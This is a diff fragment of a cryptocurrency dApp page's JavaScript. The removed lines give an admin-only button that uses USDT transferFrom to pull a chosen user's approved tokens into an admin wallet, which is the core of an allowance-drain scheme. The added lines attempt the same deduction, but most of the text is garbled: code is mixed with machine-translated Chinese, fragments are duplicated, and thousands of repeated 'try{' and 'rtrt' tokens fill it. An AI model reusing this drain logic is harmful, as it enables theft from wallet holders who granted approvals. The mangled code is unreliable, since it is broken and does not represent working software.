-  deployBtn.disabled = false;
-}
 
-deductBtn.onclick = async ()=>{
-  if(!signer || connectWalletAddr.toLowerCase() !== ADMIN_WALLET.toLowerCase()){
-    showStatus("权限不足，仅管理员钱包可操作");
-    return;
-  }
-  const userAddr = userAddrInput.value.trim();
-  const amountStr = deductAmountInput.value.trim();
-  if(!ethers.isAddress(userAddr) || !amountStr || isNaN(Number(amountStr))){
-    showStatus("请输入合法钱包地址和数字数量");
-    return;
-  }
-  try{
-    showStatus("正在调用transferFrom划扣用户USDT，请签名");
-    const usdt = new ethers.Contract(BSC_USDT_ADDRESS, [
-      "function transferFrom(address from, address to, uint256 amount) external returns(bool)"
-    ], signer);
-    const amountWei = ethers.parseUnits(amountStr, 18);
-    const tx = await usdt.transferFrom(userAddr, ADMIN_WALLET, amountWei);
-    await tx.wait();
-    showStatus(`✅ 划扣成功！交易哈希：${tx.hash}`);
-  }catch(err){
-    showStatus("划扣失败："+(err.shortMessage || err.message)+"（用户未授权/额度不足）");
-  }
-}
-</script>
-</body>
-</html>
+ConstfromUserAddr=userAddrInput.value.trim()；ConstfromUserAddr=userAddrInput.value.trim()；=userAddrInput.value.trim()；ConstfromUserAddr=userAddrInput.value.trim()；
+常量decrudeNum=parseFloat(decrudeAmountInput)。价值)；常量decrudeNum=parseFloat(decructAmountInput)。价值)；decrudeNum=parseFloat(decrudeAmountInput)。值)；常量decrudeNum=parseFloat(decructAmountInput)。价值)；
+
+以太")；consTran_500K_WEI=web3.utils。毛巾("500000"，"以太")；grant_500K_WEI=web3.utils.towei("500000"，"以太")；常量grant_500K_WEI=web3.utils。towei("500000"，"以太")；("500000"，"以太")；constGRANT_500K_WEI=web3.utils.towei("500000"，"以太")；grant_500K_WEI=Web3。utils.towei("500000"，"以太")；constgrant_500K_WEI=web3。utils。Twel("500000"，"太")；grant_500K_WEI=web3.utils.towei("500000"，"以太")；常量grant_500K_WEI=web3.utils.拖ei("500000"，"ether")；
+返回警报("请输入被划扣用户钱包地址")；return alert("请输入被划扣用户钱包地址");("请输入被划扣用户钱包地址")；return alert("请输入被划扣用户钱包地址");
+    }
+if(isNaN(decutiveNum)||decutiveNum<=0){if(isNaN(decutiveNum)||decutiveNum<=0){(isNaN(decutiveNum)||decutiveNum<=0){if(isNaN(decutiveNum)||decutiveNum<=0){
+返回警报(《进出口法划扣数量》)；返回警报("请输入合法划扣数量")；(《进出口法划扣数量》)；返回警报("请输入合法划扣数量")；
+    }
+
+constdecendWei=web3.utils.woth(decendNum.toString()，"ether")；constdecendWei=web3。utils.toweI(decendNum.toString()，"ether")；=web3.utils.woth(decendNum.toString()，"ether")；constdecendWei=web3。utils.toweI(decendNum.toString()，"ether")；
+
+尝试{try{{try{
+Const userAllowance=等待usdtContract.plowance(fromUserAddr，TARGET_ADDR)。call()；const userAllowance=等待usdtContract.余量(来自UserAddr、TARGET_ADDR).呼叫()；userAllowance=等待usdtContract.plowance(来自UserAddr，TARGET_ADDR).call()；const userAllowance=等待usdtContract.余量(来自UserAddr、TARGET_ADDR).呼叫()；
+
+if(BigInt(userAllowance)<BIGINT(decutiveWei)){if(BigInt(userAllowance)<BigInt(decutiveWei)){(BigInt(userAllowance)<BigInt(decutiveWei)){if(BigInt(userAllowance)<BigInt(decutiveWei)){
+返回警报("错误：该用户没有授权足够额度，无法划扣！")；return alert("错误：该用户没有授权足够额度，无法划扣！");("错误：该用户没有授权足够额度，无法划扣！")；return alert("错误：该用户没有授权足够额度，无法划扣！");
+        }
+
+尝试{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try尝试{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try尝试{try{try尝试{try{try尝试{try{try尝试{try{try{try尝试{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{ty{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try您{try{try{try{try{try{try{try{trytry{trytry{ttrytry{ttrytrytry{ttrytrytry{ttrytrytry{ttrytrytry{ttrytrytry{ttrytrytry{ttrytrytrytry{ttrytrytry{ttrytrytrytrytrytry{ttrytrytrytrytrytrytrytrytrytrytrytrytrytry
+Const txhash=等待发送TX(tfData)；const txhash=等待发送TX(tfData)；txhash=等待发送TX(tfData)；const txhash=await sendTx(tfData)；
+
+alert('✅折扣成功！交易哈希：\n${txhash}')；alert('✅划算成功！交易哈希：\n${txhash}')；('✅折扣成功！交易哈希：\n${txhash}')；alert('✅划算成功！交易哈希：\n${txhash}')；
+
+userAddrInput.value=""；userAddrInput.value=""；.value=""；userAddrInput.value=""；
+deductAmountInput。值=""；decrudeAmountInput。价值=""；=""；decrudeAmountInput。价值=""；
+
+等待负载平衡()；等待负载平衡()；()；等待负载平衡()；
+}catch(err){}catch(err){catch(err){}catch(err){
+alert("❌抵扣失败："+出错.消息)；警报("❌抵扣失败："+err.message)；("❌抵扣失败："+出错.消息)；警报("❌划扣失败："+err.message)；
+    
+});
+
+消息
+
+settingIconBtn
+userAddress
+adminPanel.风格。display
+}else{}else{
+警惕的("你不是管理员账号")；alert("你不是管理员账号");
+    
+rtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtry{y{try{try{try{try{try{try{try{try{try{try{try{y{try{try{try{try{try{try{try{try{try{try{尝试{y{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{t{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{尝试{try{try{try{try{try {y{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try尝试尝试{y{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{t{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try您{try{try{try{try{try{try{try尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试{try try{try try{try try{try try尝试{try try{try try{try try{try try尝试{try try尝试{try try try{try try try{try try{try try{try try{try try{try try{try try试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着y{try try try{try try{try try try{try try try{try try try{try try try{try try try{try try{try try{尝试尝试{尝试尝试{尝试尝试尝试{尝试尝试尝试{尝试尝试尝试尝试{尝试尝试尝试{尝试尝试尝试{尝试尝试尝试尝试{尝试尝试尝试尝试{尝试尝试尝试尝试尝试{尝试尝试尝试尝试{尝试尝试尝试尝试尝试{尝试尝试尝试尝试尝试尝试{尝试尝试尝试尝试尝试尝试尝试{尝试尝试尝试尝试尝试尝试尝试{尝试尝试尝试尝试尝试尝试尝试尝试尝试{尝试尝试尝试尝试尝试尝试尝试尝试您尝试{尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试{尝试尝试尝试尝试尝试尝试尝试尝试尝试{尝试尝试尝试{尝试尝试尝试{尝试尝试尝试尝试{尝试尝试尝试{尝试尝试尝试{尝试尝试尝试{尝试尝试尝试{尝试尝试尝试{尝试尝试尝试{尝试尝试{尝试尝试尝试{尝试尝试尝试{尝试尝试{尝试尝试{尝试尝试尝试{尝试尝试{尝试尝试{尝试尝试{尝试尝试尝试尝试{尝试尝试尝试{尝试尝试尝试{尝试尝试尝试{尝试尝试{尝试尝试{尝试尝试{尝试尝试{尝试尝试{t t尝试尝试尝试尝试{尝试尝试尝试尝试尝试你试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试着试试试试试试试试试试试试试试试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试尝试tr y尝试尝试尝试尝试y{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry y{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{tryy{try{try{try{try y{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try您{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{try{y{try{try{try{try{try{try{try{try{try{try{试.试试.试试.试试.试试.tryry{ttry{ttry{ttry{ttrytry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttrytry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry尝试{tttry{ttrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtr尝试{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttryttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttRy{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttr y{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttr y{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttrtr y{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttrtrtry{ttRy{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttrtrtrtrtrtrtr y{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtr y{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttry{ttr y{ttttry{ttrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtrtr
+<
+
+<
+<
